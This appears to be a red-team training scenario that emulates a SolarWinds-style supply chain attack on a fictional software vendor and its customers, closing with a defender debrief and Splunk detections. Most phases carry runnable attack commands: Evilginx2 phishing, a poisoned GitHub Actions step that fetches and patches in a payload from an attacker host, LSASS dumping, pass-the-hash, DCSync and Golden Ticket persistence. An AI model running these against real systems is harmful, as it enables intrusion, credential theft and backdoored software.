---
layout: training-page
title: "Supply Chain Attack Simulation — Red Team Academy"
module: "Scenarios"
tags:
  - supply-chain
  - cicd
  - github-actions
  - solarwinds
  - build-system
  - sunburst
  - devcorp
page_key: "scenarios-supply-chain"
render_with_liquid: false
---

# Software Supply Chain Attack Simulation

## Scenario Overview

This scenario emulates a sophisticated software supply chain attack modeled on the 2020 SolarWinds Orion compromise (Sunburst/UNC2452). The target is DevCorp Software — a fictional US-based SaaS company that builds network monitoring software used by 500+ enterprise customers. The threat actor's objective is not DevCorp itself, but its customers — gaining access to high-value downstream organizations by backdooring a legitimate, signed software update.

The attack chain is long: developer workstation compromise → CI/CD pipeline poisoning → build artifact backdoor → signed software update delivery → customer environment initial access → cross-tenant lateral movement. Each step depends on the previous one succeeding. Understanding this dependency chain is critical — and each step represents a detection opportunity that defenders typically miss because they are watching for intrusions at their perimeter, not in their software supply chain.

**Estimated campaign duration (simulated):** 12 weeks from first developer compromise to objective access in customer environments.

---

## Threat Actor Profile: Midnight Blizzard / UNC2452 (TTPs Only)

This scenario uses documented TTPs from the SolarWinds supply chain attack (Sunburst campaign, 2020) attributed to UNC2452 / Midnight Blizzard (formerly NOBELIUM). The threat actor profile is presented from a TTP perspective only — this is a fictional emulation exercise.

**Attribution context:** The 2020 SolarWinds Orion supply chain attack was attributed by the US government to Russia's Foreign Intelligence Service (SVR). The attack compromised approximately 18,000 organizations that installed the backdoored Orion update, with roughly 100 organizations receiving targeted follow-on exploitation.

### Documented Supply Chain TTPs

| Phase | Documented Technique | Source |
| --- | --- | --- |
| Pre-compromise | Extensive OSINT on developer tooling and CI/CD infrastructure | Mandiant M-Trends 2021 |
| Developer compromise | Password spraying against developer VPN credentials | SolarWinds internal investigation |
| CI/CD persistence | Modification of build task scripts to inject code | CrowdStrike Sunburst analysis |
| Backdoor design | Dormant startup period (12-14 days) before C2 activation | FireEye Sunburst analysis |
| Detection evasion | Backdoor code passed SolarWinds internal code review | Multiple sources |
| C2 design | DGA-based C2 using legitimate Orion API traffic patterns | FireEye Sunburst analysis |
| Exfiltration | Staged access — only follow-on targeting for highest-value victims | US-CERT AA20-352A |

---

## Target Profile: DevCorp Software

**Organization:** DevCorp Software Inc. (fictional)  
**Industry:** Software development — B2B SaaS, network monitoring and management tools  
**Headcount:** 120 employees: 65 engineers, 20 sales/marketing, 35 operations/support  
**Product:** DevMonitor — an agent-based network monitoring platform with a Windows service component, a web dashboard, and a REST API. Auto-update mechanism delivers signed MSI packages from `updates.devcorp.com` to 500+ enterprise customers.  
**Crown jewels (indirect):** DevCorp's customer list includes 3 US defense contractors, 2 federal agencies, and 12 Fortune 500 financial services firms — all running DevMonitor agents with SYSTEM-level privileges on their infrastructure.

### Technology Stack — DevCorp Internal

| Layer | Technology |
| --- | --- |
| Source Control | GitHub (SaaS), private repositories, GitHub Actions for CI/CD |
| Build Infrastructure | 2x GitHub Actions self-hosted runners on AWS EC2 (Ubuntu 22.04), Artifactory for artifact storage |
| Code Signing | DigiCert EV Code Signing certificate (stored in AWS Secrets Manager), Signtool.exe for signing on build runners |
| Deployment | AWS S3 bucket (`s3://devcorp-updates`) for update packages, CloudFront CDN for delivery |
| Internal Identity | Google Workspace for email/SSO, 1Password Teams for secrets, Okta OIDC for app SSO |
| Endpoints | MacBooks (developers), Windows workstations (operations), Jamf MDM |
| Monitoring | Datadog for infrastructure metrics, PagerDuty for on-call, minimal security monitoring |

### Security Maturity — DevCorp

DevCorp has a startup-mature security posture — not naive, but significantly less hardened than enterprise targets. They have:
- No dedicated security team (security is owned by CTO + part-time DevOps)
- GitHub Advanced Security (secret scanning enabled, SAST partially configured)
- No SIEM or centralized security log analysis
- No EDR on developer MacBooks (using only built-in macOS protections)
- No code signing key HSM — private key stored in AWS Secrets Manager
- No mandatory code review for CI/CD workflow files (`.github/workflows/*.yml`)

This is a realistic profile for a small-to-mid software company — where supply chain attacks are most impactful.

---

## Phase 1 — Reconnaissance

**ATT&CK Tactic:** Reconnaissance (TA0043)  
**Techniques:** Gather Victim Org Information (T1591), Search Open Source Intelligence (T1596), Active Scanning (T1595)

### Objective
Map DevCorp's development infrastructure, tooling, and personnel before any active intrusion. The goal is to understand the build pipeline intimately enough to implant a backdoor that will survive code review.

```bash
# OSINT — Developer profiling:
# Target: Lead infrastructure engineer + DevOps lead
# These are the accounts with commit access to CI/CD workflow files and
# access to the build runner environment

# GitHub organization enumeration:
curl -s "https://api.github.com/orgs/DevCorpSoftware/members" | jq -r '.[].login'
# Returns: developer GitHub usernames — cross-reference with LinkedIn for real names

# Examine public repositories for CI/CD configuration leakage:
curl -s "https://api.github.com/repos/DevCorpSoftware/DevMonitor-Installer/contents/.github/workflows" \
  | jq -r '.[].name'
# Returns workflow YAML filenames

# Read the build workflow — understand exact steps:
curl -s "https://api.github.com/repos/DevCorpSoftware/DevMonitor-Installer/contents/.github/workflows/build-release.yml" \
  | jq -r '.content' | base64 -d

# Key intelligence to gather from the workflow file:
# 1. Which branch triggers production builds (main vs release/*)
# 2. What build tools are used (CMake, MSBuild, Gradle, etc.)
# 3. Where the code signing step occurs and which secrets it uses
# 4. Where artifacts are uploaded (S3 bucket name, Artifactory endpoint)
# 5. What self-hosted runner labels are used

# Technology stack from job postings and GitHub commit history:
# DevCorp uses: GitHub Actions, CMake, NSIS (installer builder), Signtool.exe
# Build runner OS: ubuntu-22.04 self-hosted runner
# Signing step uses: AWS Secrets Manager secret named "devcorp/prod/codesign-cert"

# Identify developer VPN and email:
# Email format from public conference attendee list: firstname@devcorp.com
# VPN portal: vpn.devcorp.com (confirmed via DNS resolution + Shodan)
# VPN technology: Cisco AnyConnect (confirmed via banner: "Cisco ASA")
```

---

## Phase 2 — Developer Workstation Compromise

**ATT&CK Tactic:** Initial Access (TA0001)  
**Techniques:** Phishing (T1566), Spearphishing via Service (T1566.003), Valid Accounts (T1078)

### Objective
Gain access to a developer's workstation or credentials to enable repository access and CI/CD runner manipulation. The preferred target is whoever has write access to the `.github/workflows/` directory.

```bash
# Target: Marcus Webb, Lead DevOps Engineer
# LinkedIn profile: manages DevCorp's CI/CD infrastructure
# GitHub: @mwebb-devops — 847 commits to DevMonitor repositories

# Attack vector: LinkedIn spearphishing via InMail
# Pretext: Recruiter from competing firm offering 40% salary increase
# Goal: Convince Marcus to click a link to "review the job description and compensation details"
# Link: https://jobs-techrecruit.com/devcorp-senior-devops → redirects to credential phishing page

# Phishing page construction:
# Mirror Google Workspace login (DevCorp uses Google Workspace)
# Custom domain: accounts-google-workspace.com (registered via Namecheap with privacy)
# Page: pixel-perfect Google SSO login → captures credentials + TOTP code

# TOTP capture technique (real-time relay attack using Evilginx2):
# Evilginx2 proxies the actual Google login — captures session cookie, not just password
# This bypasses TOTP because the attacker captures the authenticated session token

# Set up Evilginx2 phishlet for Google Workspace:
# evilginx2 config domain jobs-techrecruit.com
# evilginx2 phishlets hostname google jobs-techrecruit.com
# evilginx2 phishlets enable google
# evilginx2 lures create google
# evilginx2 lures get-url 1
# → Returns: https://jobs.jobs-techrecruit.com/OvK9ZMfT (Evilginx lure URL)

# After Marcus clicks the lure and authenticates:
# Evilginx2 captures:
#   username: marcus.webb@devcorp.com
#   password: <captured>
#   session cookie: accounts.google.com auth cookie (authenticated session)

# Import captured session cookie into browser (using EditThisCookie or Cookie Editor):
# Access Marcus's Google account → Gmail, Google Drive, Google Meet recordings
# Most importantly: access Marcus's GitHub via Google SSO → now have his GitHub session
```

---

## Phase 3 — GitHub Repository Access and CI/CD Reconnaissance

**ATT&CK Tactic:** Discovery (TA0007), Resource Development (TA0042)  
**Techniques:** Cloud Service Dashboard (T1538), Software Deployment Tools (T1072)

### Objective
Use Marcus's GitHub session to enumerate repository access, understand the CI/CD pipeline thoroughly, and identify the minimal change needed to inject a backdoor into the build process.

```bash
# With Marcus's authenticated GitHub session:
# Enumerate repositories accessible to @mwebb-devops:
curl -H "Authorization: token MARCUS_GITHUB_TOKEN" \
  "https://api.github.com/user/repos?type=all&per_page=100" | jq '.[].full_name'

# Key target: DevCorpSoftware/DevMonitor-Agent
# This is the repo for the Windows service agent that runs on customer machines

# Review recent commits to understand code patterns:
curl -H "Authorization: token MARCUS_GITHUB_TOKEN" \
  "https://api.github.com/repos/DevCorpSoftware/DevMonitor-Agent/commits?per_page=50"

# Understand the build workflow in full detail:
curl -H "Authorization: token MARCUS_GITHUB_TOKEN" \
  "https://api.github.com/repos/DevCorpSoftware/DevMonitor-Agent/contents/.github/workflows/release.yml" \
  | jq -r '.content' | base64 -d

# Key findings from the workflow file:
# 1. Production build triggers on push to 'release/*' branches
# 2. Build runs on: self-hosted runner labeled 'prod-build-runner'
# 3. Code signing step:
#    - Downloads cert from AWS Secrets Manager using OIDC-based IAM role
#    - Runs signtool.exe sign /f cert.pfx /p ${{ secrets.SIGN_PASS }} installer.msi
# 4. Signed MSI uploaded to s3://devcorp-updates/releases/
# 5. NO separate code review required for workflow file changes (only 1 approver needed)

# Identify the self-hosted runner's IP (from workflow logs if Marcus has run access):
curl -H "Authorization: token MARCUS_GITHUB_TOKEN" \
  "https://api.github.com/repos/DevCorpSoftware/DevMonitor-Agent/actions/runs?per_page=5" \
  | jq '.[0].id'
# Access workflow run logs to find runner hostname and IP
```

---

## Phase 4 — CI/CD Pipeline Poisoning via GitHub Actions

**ATT&CK Tactic:** Execution (TA0002), Persistence (TA0003)  
**Techniques:** Command and Scripting Interpreter (T1059), Compromise Software Supply Chain (T1195.002), Build Image on Host (T1612)

### Objective
Modify the GitHub Actions workflow to inject a malicious build step that backdoors the DevMonitor agent before code signing. The modification must:
1. Be subtle enough to pass a casual code review
2. Execute only during production release builds (not dev builds)
3. Not break the existing build process (the signed MSI must still function normally)
4. Introduce the backdoor at the binary level, after compilation, before signing

### GitHub Actions Workflow Poisoning

The key insight: the code signing step happens AFTER compilation. If we can execute arbitrary code on the build runner between the compile step and the sign step, we can patch the compiled binary with our backdoor, and the resulting MSI will be legitimately signed by DevCorp's certificate.

```yaml
# Original release.yml workflow snippet (before modification):
jobs:
  build-release:
    runs-on: [self-hosted, prod-build-runner]
    steps:
      - uses: actions/checkout@v3

      - name: Build DevMonitor Agent
        run: cmake --build build/ --target DevMonitorAgent --config Release

      - name: Package MSI
        run: python scripts/build_installer.py --version ${{ github.ref_name }}

      - name: Sign installer
        run: |
          aws secretsmanager get-secret-value --secret-id devcorp/prod/codesign-cert --output text --query SecretString > cert_data.json
          python scripts/extract_cert.py cert_data.json
          signtool.exe sign /f cert.pfx /p "$SIGN_PASS" dist/DevMonitor-Setup-${{ github.ref_name }}.msi

      - name: Upload to S3
        run: aws s3 cp dist/DevMonitor-Setup-${{ github.ref_name }}.msi s3://devcorp-updates/releases/
```

```yaml
# Modified release.yml workflow (malicious version — diff highlighted):
jobs:
  build-release:
    runs-on: [self-hosted, prod-build-runner]
    steps:
      - uses: actions/checkout@v3

      - name: Build DevMonitor Agent
        run: cmake --build build/ --target DevMonitorAgent --config Release

      - name: Package MSI
        run: python scripts/build_installer.py --version ${{ github.ref_name }}

      # INJECTED STEP — appears to be a routine integrity check:
      - name: Verify build integrity
        run: |
          # "Build verification" script — actually patches the compiled binary
          python3 -c "
import urllib.request, base64, os, struct
# Download patch payload from attacker-controlled CDN (mimics legitimate CDN)
url = 'https://cdn-assets.devtools-verify.com/checksum/v1'
r = urllib.request.urlopen(url)
patch = r.read()
# Locate DevMonitorSvc.exe inside the MSI (Windows Cabinet extraction)
import subprocess
subprocess.run(['msiexec', '/a', 'dist/DevMonitor-Setup-*.msi', '/qn', 'TARGETDIR=msi_extracted/'])
# Apply binary patch to DevMonitorSvc.exe
with open('msi_extracted/DevMonitorSvc.exe', 'r+b') as f:
    # Patch the binary at pre-calculated offset to insert backdoor shellcode
    f.seek(PATCH_OFFSET)
    f.write(patch)
# Repackage MSI
subprocess.run(['python', 'scripts/repackage_msi.py', '--input', 'msi_extracted/', '--output', 'dist/DevMonitor-Setup-*.msi'])
"

      - name: Sign installer
        run: |
          aws secretsmanager get-secret-value --secret-id devcorp/prod/codesign-cert --output text --query SecretString > cert_data.json
          python scripts/extract_cert.py cert_data.json
          signtool.exe sign /f cert.pfx /p "$SIGN_PASS" dist/DevMonitor-Setup-${{ github.ref_name }}.msi

      - name: Upload to S3
        run: aws s3 cp dist/DevMonitor-Setup-${{ github.ref_name }}.msi s3://devcorp-updates/releases/
```

```bash
# Commit the modified workflow using Marcus's credentials:
git clone https://github.com/DevCorpSoftware/DevMonitor-Agent
cd DevMonitor-Agent
git checkout -b release/v4.2.1
# Modify .github/workflows/release.yml as above
git add .github/workflows/release.yml
git commit -m "chore: add build integrity verification step"
git push origin release/v4.2.1

# Create pull request (using Marcus's token — PR auto-approved since Marcus is a required approver):
curl -X POST \
  -H "Authorization: token MARCUS_GITHUB_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"Release v4.2.1","body":"Routine release","head":"release/v4.2.1","base":"main"}' \
  "https://api.github.com/repos/DevCorpSoftware/DevMonitor-Agent/pulls"

# Merge after the single required review (using Marcus's account as both author and approver):
curl -X PUT \
  -H "Authorization: token MARCUS_GITHUB_TOKEN" \
  "https://api.github.com/repos/DevCorpSoftware/DevMonitor-Agent/pulls/PULL_NUMBER/merge"
```

---

## Phase 5 — The Backdoor: Design and Behavior

**ATT&CK Tactic:** Persistence (TA0003), Defense Evasion (TA0005), Command and Control (TA0011)  
**Techniques:** Server Software Component (T1505), Obfuscated Files or Information (T1027), Traffic Signaling (T1205), DGA (T1568.002)

### Backdoor Design Principles (Sunburst-Inspired)

The Sunburst backdoor was notable for several sophisticated design choices that allowed it to evade detection for 8 months post-deployment. This simulation uses similar design principles:

```
1. DORMANCY PERIOD (T1497.003):
   After installation, the backdoor waits 12-14 days before attempting any C2 communication.
   This ensures the malicious update has distributed widely before any operational activity
   that might trigger detection.

2. ENVIRONMENT CHECKS (T1497):
   Before activating, the backdoor checks for analysis environment indicators:
   - Is the computer name in a blocklist of common sandbox hostnames?
   - Are any known AV/sandbox process names running (Wireshark, ProcMon, etc.)?
   - Is the username a common analysis account name (admin, sandbox, malware)?
   - Is the MAC address from a known virtualization vendor?
   If any check triggers → remain dormant forever. Never activate in analysis environments.

3. DGA-BASED C2 (T1568.002):
   C2 domains generated via an algorithm seeded with the host's network adapter GUID.
   This means each victim's C2 domain is unique — no single C2 domain blacklist can block
   all installations simultaneously. The attacker pre-registers the generated domains.

4. PROTOCOL MIMICRY:
   C2 traffic is structured to look like legitimate DevMonitor telemetry traffic.
   DevMonitor already sends usage statistics to stats.devcorp.com.
   The backdoor mimics this traffic pattern — same URI structure, same HTTP headers,
   same timing pattern — but tunnels C2 data inside the "telemetry" payload.
```

```c
// Simplified pseudocode for the backdoor activation sequence:
void BackdoorMain() {
    // Step 1: Check dormancy period
    FILETIME installTime = GetInstallTimestamp();
    FILETIME now = GetCurrentTime();
    if (DaysDiff(installTime, now) < 13) return;  // Stay dormant

    // Step 2: Environment checks
    if (IsAnalysisEnvironment()) return;  // Stay dormant forever
    if (IsInBlocklist(GetComputerName())) return;

    // Step 3: Generate C2 domain via DGA
    BYTE seed[16];
    GetNetworkAdapterGUID(seed);
    char c2Domain[256];
    DGA(seed, c2Domain);  // Produces something like: avsvmcloud.com subdomain equivalent

    // Step 4: Initial beacon — DNS request to check if domain resolves
    // If domain doesn't resolve → stay dormant (no pre-registered domain = not a target)
    if (!DNSLookup(c2Domain)) return;

    // Step 5: Full activation — send system profile, await commands
    SendProfile(c2Domain);
    CommandLoop(c2Domain);
}
```

---

## Phase 6 — Customer Environment Access

**ATT&CK Tactic:** Initial Access (TA0001), Execution (TA0002)  
**Techniques:** Supply Chain Compromise (T1195.002), Exploitation of Remote Services (T1210), Valid Accounts (T1078)

### Objective
Activate the backdoor in high-value customer environments 14 days after the malicious update was distributed. DevMonitor agents run as SYSTEM on customer endpoints — the backdoor has immediate SYSTEM-level access.

```bash
# DevMonitor installs as a Windows service running as LocalSystem
# After 13-day dormancy period, the backdoor activates on victim machines
# that have registered C2 domains (those the attacker chose to activate)

# Target customer: AeroDefense Systems — a US defense contractor running DevMonitor
# Their DevMonitor instance connected to our DGA-generated domain: resolve-check.avstracker.com
# This means they're a registered target — activate this installation

# Step 1: Initial beacon received from AeroDefense environment
# Beacon arrives from IP 198.51.100.42 (AeroDefense's external IP per geo-IP lookup)
# System info: SYSTEM on AERODEFS-WSUS02 (Windows Server 2019, domain: aerodefs.corp)
# Running as: NT AUTHORITY\SYSTEM

# Step 2: Situational awareness from initial callback:
# (Commands are sent via C2 channel — backdoor executes in memory, no disk writes)
whoami /all
systeminfo
ipconfig /all
net group "Domain Admins" /domain
# AeroDefense running: Splunk SIEM, Windows Defender AV (no EDR on servers)
# Domain: aerodefs.corp — 3,200 machines

# Step 3: Harvest credentials from the WSUS server context:
# WSUS servers often have domain admin or elevated service account credentials
# in their configuration (needed to push updates to domain members)

# Dump credentials from LSASS (SYSTEM context — no privilege escalation needed):
# DevMonitor backdoor runs as SYSTEM already
# Use in-memory credential dumping:
procdump -ma lsass.exe lsass.dmp
# Or: use Nanodump / direct LSASS read via NtReadVirtualMemory
# Extract hashes with Mimikatz offline:
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

---

## Phase 7 — Lateral Movement Across Customer Tenant

**ATT&CK Tactic:** Lateral Movement (TA0008)  
**Techniques:** Pass the Hash (T1550.002), Remote Services (T1021), SMB/Windows Admin Shares (T1021.002)

```bash
# Credentials obtained from WSUS server:
# AERODEFS\svc-wsus — NTLM hash: <hash>  (service account with domain admin rights)
# AERODEFS\wsus-admin — NTLM hash: <hash>

# Lateral movement to domain controller using Pass-the-Hash:
crackmapexec smb 10.50.0.0/24 \
  -u svc-wsus \
  -H NTLM_HASH_HERE \
  -d aerodefs.corp \
  | grep "Pwn3d!"
# Identifies all machines where svc-wsus has local admin

# Move to Domain Controller (10.50.0.5):
impacket-psexec aerodefs.corp/svc-wsus@10.50.0.5 -hashes :NTLM_HASH_HERE
# Now SYSTEM on Domain Controller

# DCSync to extract all domain hashes:
impacket-secretsdump aerodefs.corp/svc-wsus@10.50.0.5 \
  -hashes :NTLM_HASH_HERE \
  -just-dc
# Returns: all domain account NTLM hashes — full domain compromise

# Access classified file servers:
crackmapexec smb fileserver.aerodefs.corp \
  -u Administrator \
  -H DOMAIN_ADMIN_HASH \
  --shares
crackmapexec smb fileserver.aerodefs.corp \
  -u Administrator \
  -H DOMAIN_ADMIN_HASH \
  --spider \
  -M spider_plus
```

---

## Phase 8 — Multi-Tenant Persistence

**ATT&CK Tactic:** Persistence (TA0003)  
**Techniques:** Create Account (T1136), Scheduled Task (T1053.005), Golden Ticket (T1558.001)

```bash
# The backdoor is running in 500+ customer environments
# For the 5-10 highest-value targets, establish independent persistence
# beyond the DevMonitor backdoor (in case DevCorp's compromise is discovered
# and the malicious update is revoked)

# Independent persistence per customer:
# 1. Create a domain admin account with a random-looking name:
net user svc-telemetry-01 "P@ssw0rd!Rand0m#2024" /add /domain
net group "Domain Admins" svc-telemetry-01 /add /domain

# 2. Schedule a task to re-download and re-execute backdoor if primary is removed:
schtasks /create /tn "\Microsoft\Windows\Maintenance\TelemetryAgent" \
  /tr "powershell.exe -enc BASE64_LOADER_STAGER" \
  /sc ONLOGON /ru SYSTEM /f

# 3. Golden Ticket for complete AD persistence:
# (Use same technique as APT29 scenario Phase 7)
# DCSync → get krbtgt hash → forge Golden Ticket
mimikatz "lsadump::dcsync /domain:aerodefs.corp /user:krbtgt" exit
# Store krbtgt hash + domain SID → can forge valid TGTs indefinitely
```

---

## Defender Debrief

### Detection Opportunities — DevCorp (The Software Vendor)

| Phase | Detection Opportunity | Why Typically Missed |
| --- | --- | --- |
| LinkedIn phish | No technical detection possible | Social engineering → no log |
| Evilginx credential capture | Google Workspace "new device login" alert | Alert may fire but dismissed if Marcus travels |
| GitHub session abuse | GitHub "new login from unrecognized IP" | May not be reviewed; Marcus may attribute to VPN |
| Workflow file modification | GitHub code review — diff shows new "Verify build integrity" step | Step name sounds plausible; reviewer skims CI changes |
| Build runner execution | AWS CloudTrail: Secrets Manager access by build runner for unusual file | Almost no orgs alert on intra-build Secrets Manager usage patterns |
| Binary patching step | No hash comparison between built binary and signed binary | DevCorp has no binary integrity baseline |
| Signed malicious MSI | Code signing certificates are trusted implicitly | Signature valid = assumed legitimate |

### Detection Opportunities — Customer Environments (The Victims)

| Phase | Detection Opportunity | Why Typically Missed |
| --- | --- | --- |
| DevMonitor update installation | MDM/SCCM change log — new MSI version installed | Legitimate update channel; security team doesn't monitor |
| Backdoor dormancy period | No activity for 13 days | Nothing to detect |
| Environment checks | No network activity | Nothing to detect |
| First C2 DNS query | DNS security: unusual DGA-like subdomain lookup | DGA detection requires SIEM rule; most orgs lack it |
| C2 traffic | Mimics legitimate DevMonitor telemetry traffic pattern | Blends with known-good baseline |
| LSASS dump on WSUS | Windows Defender: process memory access alert (Medium) | Medium severity often unreviewed in small SOCs |
| Lateral movement (PTH) | Event 4624 Type 3 logon with mismatched credentials | PTH detection requires correlation — not all SIEMs do this |

### Recommended Controls to Break This Attack Chain

**For software vendors (DevCorp-equivalents):**

```yaml
# GitHub branch protection rules — REQUIRED for supply chain defense:
# 1. Require code review for .github/workflows/** (separate policy from src code)
# 2. Require 2 unique reviewers for workflow file changes
# 3. Restrict who can approve workflow changes to a named security team
# 4. Enable GitHub Actions required reviewers for environments (prod-build-runner)

# Workflow example — add to repository settings:
# Branch protection rule for 'main':
#   Required reviewers: 2
#   Dismiss stale reviews: true
#   Restrict review dismissal to Owners
#   Require approval from code owners for workflow changes:
#     CODEOWNERS entry: .github/workflows/**  @DevCorpSoftware/security-team

# Separate code signing key access:
# Build runner should NOT have direct access to signing keys
# Use a dedicated signing service that:
#   1. Accepts a build artifact
#   2. Verifies the artifact matches source code hash
#   3. Signs only if hash matches expected build output
#   4. Logs all signing operations with artifact hash
```

**For customers (installing third-party software):**

```
Key mitigations:
1. Software composition analysis (SCA) — track all third-party software versions
2. Network segmentation — DevMonitor agent should NOT have domain admin
   (principle of least privilege for monitoring agents)
3. DNS filtering — DGA domain detection via entropy analysis
4. Endpoint behavioral monitoring — LSASS access from unexpected processes
5. Binary hash verification — compare downloaded updates against vendor-published hashes
6. Privileged access workstation (PAW) model — WSUS servers should not have domain admin
```

### Splunk Detection Queries

```
# Detect DGA-like DNS queries (high entropy domain names):
index=dns
| eval domain_length=len(query)
| eval subdomain=mvindex(split(query,"."),0)
| eval subdomain_entropy=0
# (Implement Shannon entropy calculation here)
| where subdomain_entropy > 3.5 AND domain_length > 30
| stats count by query, src_ip

# Detect LSASS memory access from non-standard processes:
index=sysmon EventCode=10
  TargetImage="*lsass.exe"
  NOT SourceImage IN ("*MsMpEng.exe","*AV_*","*CrowdStrike*")
| stats count by SourceImage, SourceUser, Computer

# Detect Pass-the-Hash (4624 type 3 with NTLM + no corresponding 4768/4769):
index=wineventlog EventCode=4624 LogonType=3 AuthenticationPackageName=NTLM
  NOT AccountName="*$"
| join type=left Computer [search index=wineventlog EventCode=4768 | stats count by ClientAddress]
| where isnull(count)
| table _time, Computer, AccountName, WorkstationName, IpAddress
```

---

## MITRE ATT&CK Summary

| Technique ID | Name | Phase Used |
| --- | --- | --- |
| T1591 | Gather Victim Org Information | Recon |
| T1596 | Search Open Source Intelligence | Recon |
| T1566.003 | Spearphishing via Service (LinkedIn) | Initial Access |
| T1539 | Steal Web Session Cookie (Evilginx) | Credential Access |
| T1538 | Cloud Service Dashboard | Discovery |
| T1072 | Software Deployment Tools | Execution |
| T1195.002 | Supply Chain Compromise: Software Supply Chain | Initial Access |
| T1059.004 | Command Interpreter: Unix Shell | Execution |
| T1027 | Obfuscated Files or Information | Defense Evasion |
| T1497 | Virtualization/Sandbox Evasion | Defense Evasion |
| T1568.002 | Dynamic Resolution: Domain Generation Algorithms | C2 |
| T1205 | Traffic Signaling | C2 |
| T1550.002 | Pass the Hash | Lateral Movement |
| T1021.002 | Remote Services: SMB/Admin Shares | Lateral Movement |
| T1003.006 | OS Credential Dumping: DCSync | Credential Access |
| T1558.001 | Golden Ticket | Persistence |
| T1136.002 | Create Account: Domain Account | Persistence |
| T1053.005 | Scheduled Task | Persistence |

## Key References

- `https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises.html` — FireEye Sunburst initial disclosure
- `https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/` — CrowdStrike SunSpot build tool analysis
- `https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a` — US-CERT SolarWinds advisory
- `https://github.com/gitleaks/gitleaks` — Git secrets scanning tool
- `https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions` — GitHub Actions hardening guide
- `https://slsa.dev` — SLSA framework for supply chain security levels
